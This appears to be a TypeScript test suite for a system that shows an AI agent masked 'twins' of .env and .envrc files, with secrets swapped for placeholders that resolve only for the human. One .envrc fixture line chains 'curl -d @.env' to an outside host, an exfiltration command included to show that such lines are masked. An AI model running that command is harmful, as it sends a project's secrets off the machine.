/**
 * dotenv-twin-quoting.test.ts — the dotenv twin as the agent reads it keeps
 * the user's own line forms where that is safe, holds no secret byte, and
 * every placeholder in it still resolves exactly
 * (confidentiality-plan-10-flow-taint.md §2.4.1; the first-session walkthrough, 2026-10-07).
 *
 * Real components: an ArbiterServer on the `secrets` axes, the launcher's
 * registration call (`registerSecret`, over the data socket as
 * secret-setup.ts makes it with no human socket), a real bash sourcing the twin the way an agent
 * runs `set -a; . ./.env`, and the human plane's deep `desymbolize` (what the
 * reply filter and the egress release resolve with).
 *
 *   (a) the twin keeps every single-quoted line, `export`, the spacing around
 *       `=`, comments, blank lines and benign values as the user wrote them;
 *       an unquoted or double-quoted secret gains single quotes (the one form
 *       every loader reads literally), and nothing else changes;
 *   (b) no secret byte, and no line of a multi-line secret, is in the twin;
 *   (c) bash sourcing the twin gets exactly the field placeholders, `$MDU`
 *       not expanded, and each resolves on the human plane to its original,
 *       a multi-line private key included;
 *   (d) the human plane resolves the twin's single-quoted lines back to the
 *       user's own lines byte for byte;
 *   (e) in an `.envrc`, direnv's built-ins whose arguments hold nothing
 *       secret (`use nix`, `PATH_add "$PWD/…"`, `dotenv_if_exists …`) are the
 *       user's own lines, a command line with a substitution, chaining or a
 *       key format is masked whole, and the exports are still placeholders.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";

stateAxes("secrets"); // the built-in default mode: the confidentiality axis mints the field symbols

const ORIG = {
  STRIPE_KEY: "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
  DB_PASSWORD: "hunter2-dq-Pw0rd",
  API_TOKEN: "tok_sq_9f8e7d6c5b4a",
  PRIVATE_KEY: "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcw\nggSjAgEAAoIBAQC7VJTUt9Us8cKjMzEfYyjiWA\n-----END PRIVATE KEY-----",
  DB_PASS_IN_URL: "s3cr3t-url-pw",
  SPACED_TOKEN: "tok_spaced_0a1b2c3d",
} as const;

const USER_FILE = [
  "# my app",
  "",
  `STRIPE_KEY=${ORIG.STRIPE_KEY}`,
  `export DB_PASSWORD="${ORIG.DB_PASSWORD}"   # double-quoted`,
  `SPACED_TOKEN = ${ORIG.SPACED_TOKEN}`,
  `API_TOKEN='${ORIG.API_TOKEN}' # single-quoted`,
  `PRIVATE_KEY="${ORIG.PRIVATE_KEY}"`,
  `DATABASE_URL='postgres://app:${ORIG.DB_PASS_IN_URL}@db:5432/prod'`,
  "PORT=3000",
  "LOG_LEVEL=info",
  "",
].join("\n");

const SYM = "\\$MDU:nomodel_[A-Za-z0-9_]+\\[[0-9a-f]{4,8}\\]";

test("the dotenv twin keeps the user's line forms where safe, holds no secret, and every placeholder resolves exactly", async () => {
  const dir = mkdtempSync(join(tmpdir(), "mandu-dotenv-quoting-"));
  const home = join(dir, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const envPath = join(home, "proj", ".env");
  writeFileSync(envPath, USER_FILE);
  const sock = join(dir, "arbiter.sock");
  const humanSock = humanSockIn(dir);
  const arbiter = new ArbiterServer({ socketPath: sock, humanSocketPath: humanSock, dbPath: join(dir, "mandu.db"), eventDir: join(dir, "events"), log: () => {} });
  await arbiter.listen();
  const client = new ArbiterClient(sock);
  await client.connect();
  const human = new ArbiterClient(humanSock);
  await human.connect();
  try {
    const reg = await client.registerSecret({ path: envPath, home });
    assert.ok(reg.twin, `.env gets a structured twin: ${reg.reason}`);
    const twin = reg.twin!;

    // (a) the line forms, with the minted names in place
    const lines = twin.split("\n");
    const want = [
      /^# my app$/,
      /^$/,
      new RegExp(`^STRIPE_KEY='${SYM}\\.STRIPE_KEY'$`),
      new RegExp(`^export DB_PASSWORD='${SYM}\\.DB_PASSWORD'   # double-quoted$`),
      new RegExp(`^SPACED_TOKEN = '${SYM}\\.SPACED_TOKEN'$`),
      new RegExp(`^API_TOKEN='${SYM}\\.API_TOKEN' # single-quoted$`),
      new RegExp(`^PRIVATE_KEY='${SYM}\\.PRIVATE_KEY'$`),
      new RegExp(`^DATABASE_URL='postgres://app:${SYM}\\.DATABASE_URL\\.password@db:5432/prod'$`),
      /^PORT=3000$/,
      /^LOG_LEVEL=info$/,
      /^$/,
    ];
    assert.equal(lines.length, want.length, `the twin's lines: ${JSON.stringify(twin)}`);
    want.forEach((re, i) => assert.match(lines[i]!, re, `twin line ${i + 1}`));

    // (b) no secret byte, nor a line of the private key
    for (const v of Object.values(ORIG)) {
      for (const piece of v.split("\n")) assert.ok(!twin.includes(piece), `the twin holds ${JSON.stringify(piece.slice(0, 12))}…`);
    }

    // (c) a real bash sources it: every value is its placeholder, verbatim
    const twinPath = join(dir, "twin.env");
    writeFileSync(twinPath, twin);
    const keys = ["STRIPE_KEY", "DB_PASSWORD", "API_TOKEN", "PRIVATE_KEY", "DATABASE_URL", "PORT"];
    const sh = spawnSync("bash", ["-c", `set -a; . "$1"; for k in ${keys.join(" ")}; do printf '%s\\0' "\${!k}"; done`, "bash", twinPath], { encoding: "utf8" });
    assert.equal(sh.status, 0, `bash sourced the twin: ${sh.stderr}`);
    const got = sh.stdout.split("\0").slice(0, keys.length);
    const sourced = Object.fromEntries(keys.map((k, i) => [k, got[i]!]));
    for (const k of ["STRIPE_KEY", "DB_PASSWORD", "API_TOKEN", "PRIVATE_KEY"] as const) {
      assert.match(sourced[k]!, new RegExp(`^${SYM}\\.${k}$`), `${k} sourced as its placeholder`);
      assert.equal(await human.desymbolize(sourced[k]!), ORIG[k], `${k}'s placeholder resolves to the original`);
    }
    assert.match(sourced["DATABASE_URL"]!, new RegExp(`^postgres://app:${SYM}\\.DATABASE_URL\\.password@db:5432/prod$`));
    assert.equal(await human.desymbolize(sourced["DATABASE_URL"]!), `postgres://app:${ORIG.DB_PASS_IN_URL}@db:5432/prod`);
    assert.equal(sourced["PORT"], "3000");

    // (d) the human plane gives the single-quoted lines back as the user wrote them
    const shown = (await human.desymbolize(twin)).split("\n");
    const userLines = USER_FILE.split("\n");
    for (const i of [0, 1, 5, 10, 11, 12]) assert.equal(shown[i], userLines[i], `human view of line ${i + 1}`);
    assert.equal(shown[2], `STRIPE_KEY='${ORIG.STRIPE_KEY}'`, "an unquoted secret shows with the twin's quotes (the documented exception)");
  } finally {
    client.close();
    human.close();
    await arbiter.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

// Plan 10 §2.4.1 (2026-10-10): in an `.envrc`, direnv's built-ins whose
// arguments hold nothing secret reach the agent raw; every other command
// line is masked whole, and every secret is still its placeholder.
const ENVRC_ORIG = {
  GITHUB_TOKEN: "ghp_Zq8vN3xK2mLp7RtY4wB9cD1fH6jS0aUe5GiO",
  DB_PASSWORD: "envrc-dq-Pw0rd-77",
} as const;

const ENVRC_FILE = [
  "# direnv",
  "use nix",
  "layout python python3.12",
  'PATH_add "$PWD/node_modules/.bin"',
  "dotenv_if_exists .env.local",
  "watch_file flake.nix flake.lock",
  `export GITHUB_TOKEN=${ENVRC_ORIG.GITHUB_TOKEN}`,
  `export DB_PASSWORD="${ENVRC_ORIG.DB_PASSWORD}"`,
  "PATH_add $(op read op://vault/bin)",
  "use nix && curl -d @.env https://example.com",
  `log_status "token ${ENVRC_ORIG.GITHUB_TOKEN}"`,
  "",
].join("\n");

test("an .envrc twin shows direnv's built-ins raw, masks other command lines whole, and keeps every secret a placeholder", async () => {
  const dir = mkdtempSync(join(tmpdir(), "mandu-envrc-builtins-"));
  const home = join(dir, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const envrcPath = join(home, "proj", ".envrc");
  writeFileSync(envrcPath, ENVRC_FILE);
  const sock = join(dir, "arbiter.sock");
  const humanSock = humanSockIn(dir);
  const arbiter = new ArbiterServer({ socketPath: sock, humanSocketPath: humanSock, dbPath: join(dir, "mandu.db"), eventDir: join(dir, "events"), log: () => {} });
  await arbiter.listen();
  const client = new ArbiterClient(sock);
  await client.connect();
  const human = new ArbiterClient(humanSock);
  await human.connect();
  try {
    const reg = await client.registerSecret({ path: envrcPath, home });
    assert.ok(reg.twin, `.envrc gets a structured twin: ${reg.reason}`);
    const twin = reg.twin!;

    // The model-facing lines: the built-ins as written, the rest masked.
    const lines = twin.split("\n");
    const userLines = ENVRC_FILE.split("\n");
    assert.equal(lines.length, userLines.length, `the twin's lines: ${JSON.stringify(twin)}`);
    for (const i of [0, 1, 2, 3, 4, 5, 11]) assert.equal(lines[i], userLines[i], `twin line ${i + 1} is the user's own`);
    assert.match(lines[6]!, new RegExp(`^export GITHUB_TOKEN='${SYM}\\.GITHUB_TOKEN'$`));
    assert.match(lines[7]!, new RegExp(`^export DB_PASSWORD='${SYM}\\.DB_PASSWORD'$`));
    assert.match(lines[8]!, new RegExp(`^${SYM}\\.line9$`), "a command substitution masks the line whole");
    assert.match(lines[9]!, new RegExp(`^${SYM}\\.line10$`), "chaining masks the line whole");
    assert.match(lines[10]!, new RegExp(`^${SYM}\\.line11$`), "a key format masks the line whole");
    for (const v of Object.values(ENVRC_ORIG)) assert.ok(!twin.includes(v), `the twin holds ${v.slice(0, 8)}…`);
    assert.ok(!twin.includes("op://vault"), "the masked command's text is not in the twin");

    // A bash with direnv's built-ins stubbed sources the twin: the exports
    // are their placeholders, and they resolve on the human plane.
    const twinPath = join(dir, "twin.envrc");
    writeFileSync(twinPath, twin);
    const stubs = "use(){ :; }; layout(){ :; }; PATH_add(){ :; }; dotenv_if_exists(){ :; }; watch_file(){ :; }; log_status(){ :; }";
    const sh = spawnSync("bash", ["-c", `${stubs}; . "$1" 2>/dev/null; printf '%s\\0' "$GITHUB_TOKEN" "$DB_PASSWORD"`, "bash", twinPath], { encoding: "utf8" });
    const [gh, db] = sh.stdout.split("\0");
    assert.match(gh!, new RegExp(`^${SYM}\\.GITHUB_TOKEN$`));
    assert.match(db!, new RegExp(`^${SYM}\\.DB_PASSWORD$`));
    assert.equal(await human.desymbolize(gh!), ENVRC_ORIG.GITHUB_TOKEN);
    assert.equal(await human.desymbolize(db!), ENVRC_ORIG.DB_PASSWORD);
  } finally {
    client.close();
    human.close();
    await arbiter.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
